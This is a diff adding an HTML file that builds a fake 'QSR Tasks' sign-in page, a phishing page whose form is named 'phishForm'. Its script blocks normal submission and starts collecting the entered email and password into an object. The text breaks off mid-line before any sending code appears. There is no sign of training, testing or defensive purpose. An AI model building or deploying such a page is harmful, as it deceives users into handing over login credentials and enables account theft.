@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in | QSR Tasks</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 6px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 300px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+    }
+    button {
+      width: 100%;
+      background: #007BFF;
+      color: white;
+      border: none;
+      padding: 10px;
+      cursor: pointer;
+    }
+    .logo {
+      text-align: center;
+      font-weight: bold;
+      font-size: 1.4em;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <div class="logo">QSR Tasks Login</div>
+    <form id="phishForm">
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const data = {
+        email: this.email.value,
+        password:
